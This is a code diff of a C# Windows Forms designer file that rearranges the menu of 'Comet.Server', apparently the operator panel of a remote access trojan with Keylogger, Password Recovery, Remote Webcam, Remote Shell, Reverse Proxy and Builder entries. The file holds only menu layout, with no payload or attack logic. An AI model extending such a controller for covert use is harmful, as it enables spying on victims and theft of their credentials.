@@ -33,32 +33,24 @@ namespace Comet.Server.Forms
             this.components = new System.ComponentModel.Container();
             System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmMain));
             this.contextMenuStrip = new System.Windows.Forms.ContextMenuStrip(this.components);
+            this.remoteDesktopToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.remoteWebcamToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.fileMangToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.startupManagerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.tCPConnectionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.taskManagerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.registryEditorToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
+            this.systemInformationToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.remoteShellToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
             this.systemToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.systemInformationToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.fileManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.startupManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.taskManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.remoteShellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.connectionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.reverseProxyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.registryEditorToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.keyloggerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.sendToWebsiteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.showMessageboxToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.passwordRecoveryToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
             this.remoteExecuteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.localFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.webFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtLine = new System.Windows.Forms.ToolStripSeparator();
-            this.actionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.shutdownToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.restartToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.standbyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.surveillanceToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.passwordRecoveryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.keyloggerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.remoteDesktopToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
-            this.remoteWebcamToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.userSupportToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.showMessageboxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.remoteDesktopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.visitWebsiteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.connectionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.elevateClientPermissionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.updateToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
@@ -78,6 +70,11 @@ namespace Comet.Server.Forms
             this.settingsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.builderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.aboutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.reverseProxyToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.actionsToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.shutdownToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.restartToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.standbyToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
             this.lstClients = new Comet.Server.Controls.AeroListView();
             this.hIP = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.hTag = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
@@ -98,97 +95,141 @@ namespace Comet.Server.Forms
             // 
             this.contextMenuStrip.ImageScalingSize = new System.Drawing.Size(20, 20);
             this.contextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.remoteDesktopToolStripMenuItem1,
+            this.remoteWebcamToolStripMenuItem1,
+            this.remoteShellToolStripMenuItem1,
+            this.taskManagerToolStripMenuItem1,
+            this.fileMangToolStripMenuItem,
+            this.reverseProxyToolStripMenuItem1,
+            this.registryEditorToolStripMenuItem2,
+            this.startupManagerToolStripMenuItem1,
+            this.tCPConnectionsToolStripMenuItem,
+            this.systemInformationToolStripMenuItem1,
+            this.actionsToolStripMenuItem1,
             this.systemToolStripMenuItem,
-            this.surveillanceToolStripMenuItem,
-            this.userSupportToolStripMenuItem,
             this.connectionToolStripMenuItem,
             this.lineToolStripMenuItem,
             this.selectAllToolStripMenuItem});
             this.contextMenuStrip.Name = "ctxtMenu";
-            this.contextMenuStrip.Size = new System.Drawing.Size(226, 140);
+            this.contextMenuStrip.Size = new System.Drawing.Size(226, 402);
+            // 
+            // remoteDesktopToolStripMenuItem1
+            // 
+            this.remoteDesktopToolStripMenuItem1.Image = global::Comet.Server.Properties.Resources.monitor;
+            this.remoteDesktopToolStripMenuItem1.Name = "remoteDesktopToolStripMenuItem1";
+            this.remoteDesktopToolStripMenuItem1.Size = new System.Drawing.Size(225, 26);
+            this.remoteDesktopToolStripMenuItem1.Text = "Remote Desktop";
+            this.remoteDesktopToolStripMenuItem1.Click += new System.EventHandler(this.remoteDesktopToolStripMenuItem1_Click);
+            // 
+            // remoteWebcamToolStripMenuItem1
+            // 
+            this.remoteWebcamToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("remoteWebcamToolStripMenuItem1.Image")));
+            this.remoteWebcamToolStripMenuItem1.Name = "remoteWebcamToolStripMenuItem1";
+            this.remoteWebcamToolStripMenuItem1.Size = new System.Drawing.Size(225, 26);
+            this.remoteWebcamToolStripMenuItem1.Text = "Remote Webcam";
+            this.remoteWebcamToolStripMenuItem1.Click += new System.EventHandler(this.remoteWebcamToolStripMenuItem1_Click);
+            // 
+            // fileMangToolStripMenuItem
+            // 
+            this.fileMangToolStripMenuItem.Image = global::Comet.Server.Properties.Resources.folder;
+            this.fileMangToolStripMenuItem.Name = "fileMangToolStripMenuItem";
+            this.fileMangToolStripMenuItem.Size = new System.Drawing.Size(225, 26);
+            this.fileMangToolStripMenuItem.Text = "File Manager";
+            this.fileMangToolStripMenuItem.Click += new System.EventHandler(this.fileMangToolStripMenuItem_Click);
+            // 
+            // startupManagerToolStripMenuItem1
+            // 
+            this.startupManagerToolStripMenuItem1.Image = global::Comet.Server.Properties.Resources.application_edit;
+            this.startupManagerToolStripMenuItem1.Name = "startupManagerToolStripMenuItem1";
+            this.startupManagerToolStripMenuItem1.Size = new System.Drawing.Size(225, 26);
+            this.startupManagerToolStripMenuItem1.Text = "Startup Manager";
+            this.startupManagerToolStripMenuItem1.Click += new System.EventHandler(this.startupManagerToolStripMenuItem1_Click);
+            // 
+            // tCPConnectionsToolStripMenuItem
+            // 
+            this.tCPConnectionsToolStripMenuItem.Image = global::Comet.Server.Properties.Resources.transmit_blue;
+            this.tCPConnectionsToolStripMenuItem.Name = "tCPConnectionsToolStripMenuItem";
+            this.tCPConnectionsToolStripMenuItem.Size = new System.Drawing.Size(225, 26);
+            this.tCPConnectionsToolStripMenuItem.Text = "TCP Connections";
+            this.tCPConnectionsToolStripMenuItem.Click += new System.EventHandler(this.tCPConnectionsToolStripMenuItem_Click);
+            // 
+            // taskManagerToolStripMenuItem1
+            // 
+            this.taskManagerToolStripMenuItem1.Image = global::Comet.Server.Properties.Resources.application_cascade;
+            this.taskManagerToolStripMenuItem1.Name = "taskManagerToolStripMenuItem1";
+            this.taskManagerToolStripMenuItem1.Size = new System.Drawing.Size(225, 26);
+            this.taskManagerToolStripMenuItem1.Text = "Task Manager";
+            this.taskManagerToolStripMenuItem1.Click += new System.EventHandler(this.taskManagerToolStripMenuItem1_Click);
+            // 
+            // registryEditorToolStripMenuItem2
+            // 
+            this.registryEditorToolStripMenuItem2.Image = global::Comet.Server.Properties.Resources.registry;
+            this.registryEditorToolStripMenuItem2.Name = "registryEditorToolStripMenuItem2";
+            this.registryEditorToolStripMenuItem2.Size = new System.Drawing.Size(225, 26);
+            this.registryEditorToolStripMenuItem2.Text = "Registry Editor";
+            this.registryEditorToolStripMenuItem2.Click += new System.EventHandler(this.registryEditorToolStripMenuItem2_Click);
+            // 
+            // systemInformationToolStripMenuItem1
+            // 
+            this.systemInformationToolStripMenuItem1.Image = global::Comet.Server.Properties.Resources.information;
+            this.systemInformationToolStripMenuItem1.Name = "systemInformationToolStripMenuItem1";
+            this.systemInformationToolStripMenuItem1.Size = new System.Drawing.Size(225, 26);
+            this.systemInformationToolStripMenuItem1.Text = "System Information";
+            this.systemInformationToolStripMenuItem1.Click += new System.EventHandler(this.systemInformationToolStripMenuItem1_Click);
+            // 
+            // remoteShellToolStripMenuItem1
+            // 
+            this.remoteShellToolStripMenuItem1.Image = global::Comet.Server.Properties.Resources.terminal;
+            this.remoteShellToolStripMenuItem1.Name = "remoteShellToolStripMenuItem1";
+            this.remoteShellToolStripMenuItem1.Size = new System.Drawing.Size(225, 26);
+            this.remoteShellToolStripMenuItem1.Text = "Remote Shell";
+            this.remoteShellToolStripMenuItem1.Click += new System.EventHandler(this.remoteShellToolStripMenuItem1_Click);
             // 
             // systemToolStripMenuItem
             // 
             this.systemToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
-            this.systemInformationToolStripMenuItem,
-            this.fileManagerToolStripMenuItem,
-            this.startupManagerToolStripMenuItem,
-            this.taskManagerToolStripMenuItem,
-            this.remoteShellToolStripMenuItem,
-            this.connectionsToolStripMenuItem,
-            this.reverseProxyToolStripMenuItem,
-            this.registryEditorToolStripMenuItem,
+            this.keyloggerToolStripMenuItem1,
+            this.sendToWebsiteToolStripMenuItem,
+            this.showMessageboxToolStripMenuItem1,
+            this.passwordRecoveryToolStripMenuItem1,
             this.remoteExecuteToolStripMenuItem,
-            this.ctxtLine,
-            this.actionsToolStripMenuItem});
+            this.ctxtLine});
             this.systemToolStripMenuItem.Image = global::Comet.Server.Properties.Resources.cog;
             this.systemToolStripMenuItem.Name = "systemToolStripMenuItem";
             this.systemToolStripMenuItem.Size = new System.Drawing.Size(225, 26);
             this.systemToolStripMenuItem.Text = "Administration";
             // 
-            // systemInformationToolStripMenuItem
+            // keyloggerToolStripMenuItem1
             // 
-            this.systemInformationToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("systemInformationToolStripMenuItem.Image")));
-            this.systemInformationToolStripMenuItem.Name = "systemInformationToolStripMenuItem";
-            this.systemInformationToolStripMenuItem.Size = new System.Drawing.Size(234, 26);
-            this.systemInformationToolStripMenuItem.Text = "System Information";
-            this.systemInformationToolStripMenuItem.Click += new System.EventHandler(this.systemInformationToolStripMenuItem_Click);
+            this.keyloggerToolStripMenuItem1.Image = global::Comet.Server.Properties.Resources.keyboard_magnify;
+            this.keyloggerToolStripMenuItem1.Name = "keyloggerToolStripMenuItem1";
+            this.keyloggerToolStripMenuItem1.Size = new System.Drawing.Size(233, 26);
+            this.keyloggerToolStripMenuItem1.Text = "Keylogger";
+            this.keyloggerToolStripMenuItem1.Click += new System.EventHandler(this.keyloggerToolStripMenuItem1_Click);
             // 
-            // fileManagerToolStripMenuItem
+            // sendToWebsiteToolStripMenuItem
             // 
-            this.fileManagerToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("fileManagerToolStripMenuItem.Image")));
-            this.fileManagerToolStripMenuItem.Name = "fileManagerToolStripMenuItem";
-            this.fileManagerToolStripMenuItem.Size = new System.Drawing.Size(234, 26);
-            this.fileManagerToolStripMenuItem.Text = "File Manager";
-            this.fileManagerToolStripMenuItem.Click += new System.EventHandler(this.fileManagerToolStripMenuItem_Click);
+            this.sendToWebsiteToolStripMenuItem.Image = global::Comet.Server.Properties.Resources.world_link;
+            this.sendToWebsiteToolStripMenuItem.Name = "sendToWebsiteToolStripMenuItem";
+            this.sendToWebsiteToolStripMenuItem.Size = new System.Drawing.Size(233, 26);
+            this.sendToWebsiteToolStripMenuItem.Text = "Send to Website";
+            this.sendToWebsiteToolStripMenuItem.Click += new System.EventHandler(this.sendToWebsiteToolStripMenuItem_Click);
             // 
-            // startupManagerToolStripMenuItem
+            // showMessageboxToolStripMenuItem1
             // 
-            this.startupManagerToolStripMenuItem.Image = global::Comet.Server.Properties.Resources.application_edit;
-            this.startupManagerToolStripMenuItem.Name = "startupManagerToolStripMenuItem";
-            this.startupManagerToolStripMenuItem.Size = new System.Drawing.Size(234, 26);
-            this.startupManagerToolStripMenuItem.Text = "Startup Manager";
-            this.startupManagerToolStripMenuItem.Click += new System.EventHandler(this.startupManagerToolStripMenuItem_Click);
+            this.showMessageboxToolStripMenuItem1.Image = global::Comet.Server.Properties.Resources.information;
+            this.showMessageboxToolStripMenuItem1.Name = "showMessageboxToolStripMenuItem1";
+            this.showMessageboxToolStripMenuItem1.Size = new System.Drawing.Size(233, 26);
+            this.showMessageboxToolStripMenuItem1.Text = "Show Messagebox";
+            this.showMessageboxToolStripMenuItem1.Click += new System.EventHandler(this.showMessageboxToolStripMenuItem1_Click);
             // 
-            // taskManagerToolStripMenuItem
+            // passwordRecoveryToolStripMenuItem1
             // 
-            this.taskManagerToolStripMenuItem.Image = global::Comet.Server.Properties.Resources.application_cascade;
-            this.taskManagerToolStripMenuItem.Name = "taskManagerToolStripMenuItem";
-            this.taskManagerToolStripMenuItem.Size = new System.Drawing.Size(234, 26);
-            this.taskManagerToolStripMenuItem.Text = "Task Manager";
-            this.taskManagerToolStripMenuItem.Click += new System.EventHandler(this.taskManagerToolStripMenuItem_Click);
-            // 
-            // remoteShellToolStripMenuItem
-            // 
-            this.remoteShellToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("remoteShellToolStripMenuItem.Image")));
-            this.remoteShellToolStripMenuItem.Name = "remoteShellToolStripMenuItem";
-            this.remoteShellToolStripMenuItem.Size = new System.Drawing.Size(234, 26);
-            this.remoteShellToolStripMenuItem.Text = "Remote Shell";
-            this.remoteShellToolStripMenuItem.Click += new System.EventHandler(this.remoteShellToolStripMenuItem_Click);
-            // 
-            // connectionsToolStripMenuItem
-            // 
-            this.connectionsToolStripMenuItem.Image = global::Comet.Server.Properties.Resources.transmit_blue;
-            this.connectionsToolStripMenuItem.Name = "connectionsToolStripMenuItem";
-            this.connectionsToolStripMenuItem.Size = new System.Drawing.Size(234, 26);
-            this.connectionsToolStripMenuItem.Text = "TCP Connections";
-            this.connectionsToolStripMenuItem.Click += new System.EventHandler(this.connectionsToolStripMenuItem_Click);
-            // 
-            // reverseProxyToolStripMenuItem
-            // 
-            this.reverseProxyToolStripMenuItem.Image = global::Comet.Server.Properties.Resources.server_link;
-            this.reverseProxyToolStripMenuItem.Name = "reverseProxyToolStripMenuItem";
-            this.reverseProxyToolStripMenuItem.Size = new System.Drawing.Size(234, 26);
-            this.reverseProxyToolStripMenuItem.Text = "Reverse Proxy";
-            this.reverseProxyToolStripMenuItem.Click += new System.EventHandler(this.reverseProxyToolStripMenuItem_Click);
-            // 
-            // registryEditorToolStripMenuItem
-            // 
-            this.registryEditorToolStripMenuItem.Image = global::Comet.Server.Properties.Resources.registry;
-            this.registryEditorToolStripMenuItem.Name = "registryEditorToolStripMenuItem";
-            this.registryEditorToolStripMenuItem.Size = new System.Drawing.Size(234, 26);
-            this.registryEditorToolStripMenuItem.Text = "Registry Editor";
-            this.registryEditorToolStripMenuItem.Click += new System.EventHandler(this.registryEditorToolStripMenuItem_Click);
+            this.passwordRecoveryToolStripMenuItem1.Image = global::Comet.Server.Properties.Resources.key_go;
+            this.passwordRecoveryToolStripMenuItem1.Name = "passwordRecoveryToolStripMenuItem1";
+            this.passwordRecoveryToolStripMenuItem1.Size = new System.Drawing.Size(233, 26);
+            this.passwordRecoveryToolStripMenuItem1.Text = "Password Recovery";
+            this.passwordRecoveryToolStripMenuItem1.Click += new System.EventHandler(this.passwordRecoveryToolStripMenuItem1_Click);
             // 
             // remoteExecuteToolStripMenuItem
             // 
@@ -197,7 +238,7 @@ namespace Comet.Server.Forms
             this.webFileToolStripMenuItem});
             this.remoteExecuteToolStripMenuItem.Image = global::Comet.Server.Properties.Resources.lightning;
             this.remoteExecuteToolStripMenuItem.Name = "remoteExecuteToolStripMenuItem";
-            this.remoteExecuteToolStripMenuItem.Size = new System.Drawing.Size(234, 26);
+            this.remoteExecuteToolStripMenuItem.Size = new System.Drawing.Size(233, 26);
             this.remoteExecuteToolStripMenuItem.Text = "Remote Execute";
             // 
             // localFileToolStripMenuItem
@@ -219,121 +260,7 @@ namespace Comet.Server.Forms
             // ctxtLine
             // 
             this.ctxtLine.Name = "ctxtLine";
-            this.ctxtLine.Size = new System.Drawing.Size(231, 6);
-            // 
-            // actionsToolStripMenuItem
-            // 
-            this.actionsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
-            this.shutdownToolStripMenuItem,
-            this.restartToolStripMenuItem,
-            this.standbyToolStripMenuItem});
-            this.actionsToolStripMenuItem.Image = global::Comet.Server.Properties.Resources.actions;
-            this.actionsToolStripMenuItem.Name = "actionsToolStripMenuItem";
-            this.actionsToolStripMenuItem.Size = new System.Drawing.Size(234, 26);
-            this.actionsToolStripMenuItem.Text = "Actions";
-            // 
-            // shutdownToolStripMenuItem
-            // 
-            this.shutdownToolStripMenuItem.Image = global::Comet.Server.Properties.Resources.shutdown;
-            this.shutdownToolStripMenuItem.Name = "shutdownToolStripMenuItem";
-            this.shutdownToolStripMenuItem.Size = new System.Drawing.Size(166, 26);
-            this.shutdownToolStripMenuItem.Text = "Shutdown";
-            this.shutdownToolStripMenuItem.Click += new System.EventHandler(this.shutdownToolStripMenuItem_Click);
-            // 
-            // restartToolStripMenuItem
-            // 
-            this.restartToolStripMenuItem.Image = global::Comet.Server.Properties.Resources.restart;
-            this.restartToolStripMenuItem.Name = "restartToolStripMenuItem";
-            this.restartToolStripMenuItem.Size = new System.Drawing.Size(166, 26);
-            this.restartToolStripMenuItem.Text = "Restart";
-            this.restartToolStripMenuItem.Click += new System.EventHandler(this.restartToolStripMenuItem_Click);
-            // 
-            // standbyToolStripMenuItem
-            // 
-            this.standbyToolStripMenuItem.Image = global::Comet.Server.Properties.Resources.standby;
-            this.standbyToolStripMenuItem.Name = "standbyToolStripMenuItem";
-            this.standbyToolStripMenuItem.Size = new System.Drawing.Size(166, 26);
-            this.standbyToolStripMenuItem.Text = "Standby";
-            this.standbyToolStripMenuItem.Click += new System.EventHandler(this.standbyToolStripMenuItem_Click);
-            // 
-            // surveillanceToolStripMenuItem
-            // 
-            this.surveillanceToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
-            this.passwordRecoveryToolStripMenuItem,
-            this.keyloggerToolStripMenuItem,
-            this.remoteDesktopToolStripMenuItem2,
-            this.remoteWebcamToolStripMenuItem});
-            this.surveillanceToolStripMenuItem.Image = global::Comet.Server.Properties.Resources.monitoring;
-            this.surveillanceToolStripMenuItem.Name = "surveillanceToolStripMenuItem";
-            this.surveillanceToolStripMenuItem.Size = new System.Drawing.Size(225, 26);
-            this.surveillanceToolStripMenuItem.Text = "Monitoring";
-            // 
-            // passwordRecoveryToolStripMenuItem
-            // 
-            this.passwordRecoveryToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("passwordRecoveryToolStripMenuItem.Image")));
-            this.passwordRecoveryToolStripMenuItem.Name = "passwordRecoveryToolStripMenuItem";
-            this.passwordRecoveryToolStripMenuItem.Size = new System.Drawing.Size(233, 26);
-            this.passwordRecoveryToolStripMenuItem.Text = "Password Recovery";
-            this.passwordRecoveryToolStripMenuItem.Click += new System.EventHandler(this.passwordRecoveryToolStripMenuItem_Click);
-            // 
-            // keyloggerToolStripMenuItem
-            // 
-            this.keyloggerToolStripMenuItem.Image = global::Comet.Server.Properties.Resources.keyboard_magnify;
-            this.keyloggerToolStripMenuItem.Name = "keyloggerToolStripMenuItem";
-            this.keyloggerToolStripMenuItem.Size = new System.Drawing.Size(233, 26);
-            this.keyloggerToolStripMenuItem.Text = "Keylogger";
-            this.keyloggerToolStripMenuItem.Click += new System.EventHandler(this.keyloggerToolStripMenuItem_Click);
-            // 
-            // remoteDesktopToolStripMenuItem2
-            // 
-            this.remoteDesktopToolStripMenuItem2.Image = ((System.Drawing.Image)(resources.GetObject("remoteDesktopToolStripMenuItem2.Image")));
-            this.remoteDesktopToolStripMenuItem2.Name = "remoteDesktopToolStripMenuItem2";
-            this.remoteDesktopToolStripMenuItem2.Size = new System.Drawing.Size(233, 26);
-            this.remoteDesktopToolStripMenuItem2.Text = "Remote Desktop";
-            this.remoteDesktopToolStripMenuItem2.Click += new System.EventHandler(this.remoteDesktopToolStripMenuItem_Click);
-            // 
-            // remoteWebcamToolStripMenuItem
-            // 
-            this.remoteWebcamToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("remoteWebcamToolStripMenuItem.Image")));
-            this.remoteWebcamToolStripMenuItem.Name = "remoteWebcamToolStripMenuItem";
-            this.remoteWebcamToolStripMenuItem.Size = new System.Drawing.Size(233, 26);
-            this.remoteWebcamToolStripMenuItem.Text = "Remote Webcam";
-            this.remoteWebcamToolStripMenuItem.Click += new System.EventHandler(this.remoteWebcamToolStripMenuItem_Click);
-            // 
-            // userSupportToolStripMenuItem
-            // 
-            this.userSupportToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
-            this.showMessageboxToolStripMenuItem,
-            this.remoteDesktopToolStripMenuItem,
-            this.visitWebsiteToolStripMenuItem});
-            this.userSupportToolStripMenuItem.Image = global::Comet.Server.Properties.Resources.user;
-            this.userSupportToolStripMenuItem.Name = "userSupportToolStripMenuItem";
-            this.userSupportToolStripMenuItem.Size = new System.Drawing.Size(225, 26);
-            this.userSupportToolStripMenuItem.Text = "User Support";
-            // 
-            // showMessageboxToolStripMenuItem
-            // 
-            this.showMessageboxToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("showMessageboxToolStripMenuItem.Image")));
-            this.showMessageboxToolStripMenuItem.Name = "showMessageboxToolStripMenuItem";
-            this.showMessageboxToolStripMenuItem.Size = new System.Drawing.Size(229, 26);
-            this.showMessageboxToolStripMenuItem.Text = "Show Messagebox";
-            this.showMessageboxToolStripMenuItem.Click += new System.EventHandler(this.showMessageboxToolStripMenuItem_Click);
-            // 
-            // remoteDesktopToolStripMenuItem
-            // 
-            this.remoteDesktopToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("remoteDesktopToolStripMenuItem.Image")));
-            this.remoteDesktopToolStripMenuItem.Name = "remoteDesktopToolStripMenuItem";
-            this.remoteDesktopToolStripMenuItem.Size = new System.Drawing.Size(229, 26);
-            this.remoteDesktopToolStripMenuItem.Text = "Remote Desktop";
-            this.remoteDesktopToolStripMenuItem.Click += new System.EventHandler(this.remoteDesktopToolStripMenuItem_Click);
-            // 
-            // visitWebsiteToolStripMenuItem
-            // 
-            this.visitWebsiteToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("visitWebsiteToolStripMenuItem.Image")));
-            this.visitWebsiteToolStripMenuItem.Name = "visitWebsiteToolStripMenuItem";
-            this.visitWebsiteToolStripMenuItem.Size = new System.Drawing.Size(229, 26);
-            this.visitWebsiteToolStripMenuItem.Text = "Send to Website";
-            this.visitWebsiteToolStripMenuItem.Click += new System.EventHandler(this.visitWebsiteToolStripMenuItem_Click);
+            this.ctxtLine.Size = new System.Drawing.Size(230, 6);
             // 
             // connectionToolStripMenuItem
             // 
@@ -750,6 +677,49 @@ namespace Comet.Server.Forms
             this.aboutToolStripMenuItem.Text = "About";
             this.aboutToolStripMenuItem.Click += new System.EventHandler(this.aboutToolStripMenuItem_Click);
             // 
+            // reverseProxyToolStripMenuItem1
+            // 
+            this.reverseProxyToolStripMenuItem1.Image = global::Comet.Server.Properties.Resources.server_link;
+            this.reverseProxyToolStripMenuItem1.Name = "reverseProxyToolStripMenuItem1";
+            this.reverseProxyToolStripMenuItem1.Size = new System.Drawing.Size(225, 26);
+            this.reverseProxyToolStripMenuItem1.Text = "Reverse Proxy";
+            this.reverseProxyToolStripMenuItem1.Click += new System.EventHandler(this.reverseProxyToolStripMenuItem1_Click);
+            // 
+            // actionsToolStripMenuItem1
+            // 
+            this.actionsToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.shutdownToolStripMenuItem1,
+            this.restartToolStripMenuItem1,
+            this.standbyToolStripMenuItem1});
+            this.actionsToolStripMenuItem1.Image = global::Comet.Server.Properties.Resources.actions;
+            this.actionsToolStripMenuItem1.Name = "actionsToolStripMenuItem1";
+            this.actionsToolStripMenuItem1.Size = new System.Drawing.Size(225, 26);
+            this.actionsToolStripMenuItem1.Text = "Actions";
+            // 
+            // shutdownToolStripMenuItem1
+            // 
+            this.shutdownToolStripMenuItem1.Image = global::Comet.Server.Properties.Resources.shutdown;
+            this.shutdownToolStripMenuItem1.Name = "shutdownToolStripMenuItem1";
+            this.shutdownToolStripMenuItem1.Size = new System.Drawing.Size(224, 26);
+            this.shutdownToolStripMenuItem1.Text = "Shutdown";
+            this.shutdownToolStripMenuItem1.Click += new System.EventHandler(this.shutdownToolStripMenuItem1_Click);
+            // 
+            // restartToolStripMenuItem1
+            // 
+            this.restartToolStripMenuItem1.Image = global::Comet.Server.Properties.Resources.restart;
+            this.restartToolStripMenuItem1.Name = "restartToolStripMenuItem1";
+            this.restartToolStripMenuItem1.Size = new System.Drawing.Size(224, 26);
+            this.restartToolStripMenuItem1.Text = "Restart";
+            this.restartToolStripMenuItem1.Click += new System.EventHandler(this.restartToolStripMenuItem1_Click);
+            // 
+            // standbyToolStripMenuItem1
+            // 
+            this.standbyToolStripMenuItem1.Image = global::Comet.Server.Properties.Resources.standby;
+            this.standbyToolStripMenuItem1.Name = "standbyToolStripMenuItem1";
+            this.standbyToolStripMenuItem1.Size = new System.Drawing.Size(224, 26);
+            this.standbyToolStripMenuItem1.Text = "Standby";
+            this.standbyToolStripMenuItem1.Click += new System.EventHandler(this.standbyToolStripMenuItem1_Click);
+            // 
             // lstClients
             // 
             this.lstClients.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
@@ -866,25 +836,10 @@ namespace Comet.Server.Forms
         private System.Windows.Forms.ToolStripMenuItem systemToolStripMenuItem;
         private System.Windows.Forms.ColumnHeader hStatus;
         private System.Windows.Forms.ToolStripMenuItem uninstallToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem surveillanceToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem remoteDesktopToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem taskManagerToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem fileManagerToolStripMenuItem;
         private System.Windows.Forms.ColumnHeader hAccountType;
-        private System.Windows.Forms.ToolStripMenuItem systemInformationToolStripMenuItem;
         private System.Windows.Forms.ColumnHeader hUserStatus;
-        private System.Windows.Forms.ToolStripMenuItem passwordRecoveryToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem updateToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem remoteShellToolStripMenuItem;
         private System.Windows.Forms.ToolStripSeparator ctxtLine;
-        private System.Windows.Forms.ToolStripMenuItem actionsToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem shutdownToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem restartToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem standbyToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem startupManagerToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem keyloggerToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem reverseProxyToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem registryEditorToolStripMenuItem;
         private AeroListView lstClients;
         private System.Windows.Forms.NotifyIcon notifyIcon;
         private System.Windows.Forms.ColumnHeader hUserPC;
@@ -899,16 +854,28 @@ namespace Comet.Server.Forms
         private System.Windows.Forms.ToolStripMenuItem aboutToolStripMenuItem;
         private System.Windows.Forms.StatusStrip statusStrip;
         private System.Windows.Forms.ToolStripStatusLabel listenToolStripStatusLabel;
-        private System.Windows.Forms.ToolStripMenuItem connectionsToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem userSupportToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem showMessageboxToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem visitWebsiteToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem remoteExecuteToolStripMenuItem;
